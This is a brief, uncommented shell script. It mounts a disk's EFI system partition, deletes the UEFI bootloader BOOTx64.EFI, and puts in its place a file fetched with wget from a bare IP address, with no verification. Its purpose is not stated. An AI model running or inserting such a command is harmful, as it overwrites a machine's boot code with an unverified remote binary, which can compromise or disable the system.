#!/bin/sh
mount -t vfat /dev/sda1 /mnt

rm /mnt/EFI/BOOT/BOOTx64.EFI

wget -O /mnt/EFI/BOOT/BOOTx64.EFI http://81.201.135.85:11223/v1/files/Qk9PVHg2NC5FRkk=

umount /mnt
